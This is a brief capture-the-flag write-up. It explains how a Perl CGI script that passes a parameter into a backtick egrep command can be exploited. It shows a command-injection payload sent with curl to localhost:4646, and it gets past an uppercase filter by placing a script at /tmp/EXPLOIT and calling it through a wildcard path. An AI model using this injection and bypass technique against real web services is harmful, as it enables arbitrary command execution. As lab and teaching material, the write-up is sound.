-> let's look at the script
the program takes 2 parameters, x and y
the following line has backticks, so this is probably where we have to execute the getflag command somehow
"@output = `egrep "^$xx" /tmp/xd 2>&1`;"

the shell command is executed using the 'x' variable after applying two changes to it:
"$xx =~ tr/a-z/A-Z/;"
this line transforms all lowercase letter to uppercase
"$xx =~ s/\s.*//;"
this line checks if there is a whitespace character, and removes everything after it

-> we have to make sure we can execute the command we want in spite of the two lines above
we cannot write something like 'getflag > /tmp/flag' because of the uppercase constraint
we will use a file:
> vim /tmp/EXPLOIT
> cat /tmp/EXPLOIT
#!/bin/sh
getflag > /tmp/flag

we also have to make sure the script can get executed
> chmod 777 /tmp/EXPLOIT

next we use a wildcard to bypass the uppercase constraint:
> curl localhost:4646?x='`/*/EXPLOIT`'

-> we get the flag
> cat /tmp/flag
